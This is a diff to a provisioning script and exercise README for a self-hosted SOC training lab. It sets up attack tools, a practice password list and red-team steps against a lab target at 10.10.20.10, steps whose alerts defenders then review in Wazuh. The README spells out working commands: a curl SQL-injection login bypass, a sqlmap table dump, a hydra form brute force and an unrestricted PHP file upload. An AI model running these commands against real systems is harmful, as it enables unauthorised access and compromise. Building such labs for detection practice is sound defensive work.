@@ -5,9 +5,13 @@ set -euo pipefail
 source /opt/minisoc/lib.sh
 
 log "Installing attack tools"
-apt_install nmap nikto sqlmap hydra gobuster curl python3-requests
+apt_install nmap nikto sqlmap hydra gobuster curl
 
-install -o vagrant -g vagrant -m 755 /tmp/minisoc-kali/dvwa-bruteforce.py /home/vagrant/dvwa-bruteforce.py
+# Older builds of this lab shipped a dvwa-bruteforce.py workaround script -
+# no longer needed since the current target app's login has no CSRF token
+# for hydra to fight. Clean up the stale copy so a re-provisioned VM
+# doesn't leave it lying around as a dead giveaway.
+rm -f /home/vagrant/dvwa-bruteforce.py
 
 # A small curated list, not full rockyou: fast enough for a live demo,
 # still includes the real password so the exercise actually succeeds.
@@ -16,7 +20,7 @@ cat > /home/vagrant/passwords.txt <<'TXT'
 admin
 letmein
 qwerty
-password
+Welcome1
 changeme
 TXT
 chown vagrant:vagrant /home/vagrant/passwords.txt
@@ -27,9 +31,11 @@ Mini-SOC red team exercises (target: 10.10.20.10)
 
 target's front page (http://10.10.20.10/) is a normal-looking "Northgate
 Defense Systems" site - no hint of a training app. The actual vulnerable
-app (DVWA) is still there, just not linked from anywhere, and its login
-credentials are never just handed to you either: both are found the way
-they'd really happen, through recon and a brute force.
+app - a small, hand-written internal "Employee Portal", not a known
+training tool - is still there, just not linked from anywhere, and its
+login credentials are never just handed to you either: both are found
+the way they'd really happen, through recon, SQL injection or a brute
+force.
 
 1. Port scan:      nmap -sV 10.10.20.10
 2. Web scan:       nikto -h http://10.10.20.10/
@@ -37,19 +43,21 @@ they'd really happen, through recon and a brute force.
                      -w /usr/share/wordlists/dirb/common.txt
                      (turns up /legacy/ - an old internal tool
                      nobody decommissioned)
-4. Brute-force the login: python3 ~/dvwa-bruteforce.py ~/passwords.txt
-                     Hydra's http-post-form module can't be used as-is
-                     here - DVWA's CSRF token is single-use, so a fixed
-                     token reused across attempts always looks "wrong"
-                     to Hydra, false-positiving every password. This
-                     script does a fresh GET+token+POST per attempt,
-                     the way a real attacker's own script would.
-5. SQL injection:  sqlmap -u "http://10.10.20.10/legacy/vulnerabilities/sqli/?id=1&Submit=Submit" \
-                     --cookie="PHPSESSID=<your session>; security=low" --batch
-6. File upload:    log in to /legacy/, open "File Upload", upload any
-                     .php file - the Wazuh agent on target watches
-                     /var/www/html in real time (FIM) and alerts the moment
-                     the file lands.
+4. SQL injection (bypass, no password needed):
+                   curl -s -G http://10.10.20.10/legacy/login.php \
+                     --data-urlencode "username=' UNION SELECT 1,'admin','x'-- -" \
+                     --data-urlencode 'password=x'
+                   or automate it: sqlmap -u "http://10.10.20.10/legacy/login.php?username=admin&password=x" \
+                     --batch --dump -D portal -T users
+5. Brute-force the login (alternative to SQLi): hydra -l admin -P ~/passwords.txt \
+                     10.10.20.10 http-post-form \
+                     '/legacy/login.php:username=^USER^&password=^PASS^:F=Login failed'
+                   No CSRF token to fight here (unlike the old DVWA-based
+                   version of this lab) - hydra just works.
+6. File upload:    log in (either way above), then POST a .php file to
+                     dashboard.php's upload form - no checks at all. The
+                     Wazuh agent on target watches /var/www/html in real
+                     time (FIM) and alerts the moment the file lands.
 Then check what Suricata/Wazuh raised:
   - Wazuh dashboard (https://localhost:8444) -> Discover, index pattern
     "wazuh-alerts-*", filter by rule group "minisoc_ids" or "web".
